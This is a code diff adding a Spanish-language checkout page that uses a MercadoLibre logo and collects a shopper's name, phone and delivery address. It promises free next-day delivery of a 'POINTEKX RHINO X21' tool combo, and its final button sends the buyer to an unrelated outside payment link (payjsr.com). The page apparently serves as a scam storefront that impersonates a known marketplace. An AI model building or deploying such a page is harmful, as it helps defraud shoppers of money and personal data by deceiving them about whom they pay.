@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout - Detalles de entrega</title>
+
+<style>
+body{
+  margin:0;
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+  background:#fff;
+  color:#111;
+}
+
+.topbar{
+  height:56px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-bottom:1px solid #eee;
+  position:sticky;
+  top:0;
+  background:#fff;
+  z-index:1000;
+}
+
+.logo-img{
+  height:60px;
+}
+
+.checkout{ padding:20px 16px; }
+.checkout h2{ font-size:22px; font-weight:800; margin-bottom:16px; }
+
+.type-tabs{ display:flex; gap:10px; margin-bottom:20px; }
+
+.tab{
+  flex:1;
+  height:44px;
+  border-radius:8px;
+  border:2px solid #1a73e8;
+  background:#eaf3ff;
+  font-weight:700;
+  color:#1a73e8;
+}
+
+.field{ margin-bottom:18px; }
+
+.field label{
+  font-size:13px;
+  color:#666;
+  display:block;
+  margin-bottom:4px;
+}
+
+.field input{
+  width:100%;
+  border:none;
+  border-bottom:1px solid #ddd;
+  font-size:15px;
+  padding:6px 0;
+  outline:none;
+}
+
+.save-btn{
+  margin-top:30px;
+  width:100%;
+  height:48px;
+  border-radius:999px;
+  border:none;
+  background:#0b6ecb;
+  color:white;
+  font-size:16px;
+  font-weight:800;
+  cursor:pointer;
+}
+
+.save-btn.loading{ opacity:.8; pointer-events:none; }
+.save-btn.saved{ background:#2ecc71; }
+
+#orderReview{
+  display:none;
+  margin-top:24px;
+  border-top:1px solid #eee;
+  padding-top:20px;
+}
+
+.complete-btn{
+  margin-top:20px;
+  width:100%;
+  height:50px;
+  border-radius:999px;
+  border:none;
+  background:#00a651;
+  color:white;
+  font-size:16px;
+  font-weight:900;
+  cursor:pointer;
+  display:none;
+}
+
+.complete-btn:active{
+  transform: scale(0.98);
+}
+
+.province-modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.4);
+  display:none;
+  z-index:3000;
+}
+
+.province-modal.is-open{ display:block; }
+
+.province-sheet{
+  position:absolute;
+  left:0;
+  right:0;
+  bottom:0;
+  background:#fff;
+  border-radius:16px 16px 0 0;
+  max-height:80vh;
+  overflow:auto;
+}
+
+.province-head{
+  text-align:center;
+  font-size:18px;
+  font-weight:800;
+  padding:14px;
+  border-bottom:1px solid #eee;
+}
+
+.province-item{
+  padding:16px;
+  border-bottom:1px solid #eee;
+  font-size:16px;
+  cursor:pointer;
+}
+
+.province-item:active{ background:#f2f2f2; }
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+<img src="logo-mercadolibre.svg" alt="logo" class="logo-img">
+</div>
+
+<div class="checkout">
+
+<h2>Detalles de entrega</h2>
+
+<div class="type-tabs">
+<button class="tab">Residencial</button>
+</div>
+
+<div class="field"><label>Nombre del destinatario</label><input id="fName"></div>
+<div class="field"><label>Número de teléfono</label><input id="fPhone"></div>
+<div class="field"><label>Dirección</label><input id="fStreet"></div>
+<div class="field"><label>Departamento / Edificio</label><input></div>
+<div class="field"><label>Colonia</label><input></div>
+<div class="field"><label>Ciudad</label><input id="fCity"></div>
+
+<div class="field">
+<label>Estado</label>
+<input id="provinceInput" placeholder="Seleccionar" readonly>
+</div>
+
+<div class="field"><label>Código postal</label><input id="fPostal"></div>
+
+<button class="save-btn" id="openPayment">
+<span id="saveText">Guardar</span>
+<span id="saveLoader" style="display:none;">Guardando...</span>
+<span id="saveDone" style="display:none;">Guardado ✓</span>
+</button>
+
+<div id="orderReview">
+
+<h2>Resumen del pedido</h2>
+
+<strong>Método de entrega</strong><br>Entrega<br><br>
+
+<strong>Dirección de entrega</strong><br>
+
+<span style="background:#eee;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;">
+RESIDENCIAL
+</span>
+
+<div id="orName" style="margin-top:8px;font-weight:700;"></div>
+<div id="orAddress" style="color:#555;"></div>
+
+<div style="color:#999;">
+<span id="orPerson"></span> — <span id="orPhone"></span>
+</div>
+
+<br>
+
+<strong id="orDeliveryDate"></strong><br>
+Entrega al siguiente día hábil • Gratis
+
+<br><br>
+
+<div style="display:flex;justify-content:space-between;">
+<span style="color:#999;font-weight:700;">PRODUCTOS</span>
+</div>
+
+<div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
+<img src="p1.png" style="width:60px;height:60px;object-fit:contain;border:1px solid #eee;border-radius:6px;">
+<div style="font-size:14px;font-weight:700;">
+POINTEKX RHINO X21 – Pro Tool Combo 100X
+</div>
+</div>
+
+<button class="complete-btn" id="completePurchase">
+Completar compra
+</button>
+
+</div>
+</div>
+
+<div class="province-modal" id="provinceModal">
+<div class="province-sheet">
+
+<div class="province-head">Estado</div>
+
+<div class="province-item">Aguascalientes</div>
+<div class="province-item">Baja California</div>
+<div class="province-item">Baja California Sur</div>
+<div class="province-item">Campeche</div>
+<div class="province-item">Chiapas</div>
+<div class="province-item">Chihuahua</div>
+<div class="province-item">Ciudad de México</div>
+<div class="province-item">Coahuila</div>
+<div class="province-item">Colima</div>
+<div class="province-item">Durango</div>
+<div class="province-item">Estado de México</div>
+<div class="province-item">Guanajuato</div>
+<div class="province-item">Guerrero</div>
+<div class="province-item">Hidalgo</div>
+<div class="province-item">Jalisco</div>
+<div class="province-item">Michoacán</div>
+<div class="province-item">Morelos</div>
+<div class="province-item">Nayarit</div>
+<div class="province-item">Nuevo León</div>
+<div class="province-item">Oaxaca</div>
+<div class="province-item">Puebla</div>
+<div class="province-item">Querétaro</div>
+<div class="province-item">Quintana Roo</div>
+<div class="province-item">San Luis Potosí</div>
+<div class="province-item">Sinaloa</div>
+<div class="province-item">Sonora</div>
+<div class="province-item">Tabasco</div>
+<div class="province-item">Tamaulipas</div>
+<div class="province-item">Tlaxcala</div>
+<div class="province-item">Veracruz</div>
+<div class="province-item">Yucatán</div>
+<div class="province-item">Zacatecas</div>
+
+
+</div>
+</div>
+
+<script>
+
+provinceInput.onclick = ()=> provinceModal.classList.add("is-open");
+
+document.querySelectorAll(".province-item").forEach(item=>{
+item.onclick = ()=>{
+provinceInput.value = item.innerText;
+provinceModal.classList.remove("is-open");
+}
+});
+
+provinceModal.onclick = e=>{
+if(e.target === provinceModal)
+provinceModal.classList.remove("is-open");
+}
+
+openPayment.onclick = ()=>{
+
+openPayment.classList.add("loading");
+saveText.style.display="none";
+saveLoader.style.display="inline";
+
+setTimeout(()=>{
+
+saveLoader.style.display="none";
+saveDone.style.display="inline";
+openPayment.classList.remove("loading");
+openPayment.classList.add("saved");
+
+const name = fName.value;
+const phone = fPhone.value;
+const street = fStreet.value;
+const city = fCity.value;
+const postal = fPostal.value;
+const prov = provinceInput.value;
+
+orName.innerText = street || "Casa";
+orAddress.innerText = `${street}, ${city}, ${prov}, ${postal}`;
+orPerson.innerText = name;
+orPhone.innerText = phone;
+
+const tomorrow = new Date();
+tomorrow.setDate(tomorrow.getDate()+1);
+
+const months=[
+"enero","febrero","marzo","abril","mayo","junio",
+"julio","agosto","septiembre","octubre","noviembre","diciembre"
+];
+
+orDeliveryDate.innerText =
+`Entrega antes del ${tomorrow.getDate()} ${months[tomorrow.getMonth()]} ${tomorrow.getFullYear()}`;
+
+orderReview.style.display="block";
+
+completePurchase.style.display = "block";
+
+orderReview.scrollIntoView({behavior:"smooth"});
+
+},3000);
+}
+
+completePurchase.onclick = ()=>{
+window.location.href="https://payjsr.com/pay/bc03be59-add7-4fe8-8a46-f21a27c037dc";
+}
+
+</script>
+
+</body>
+</html>
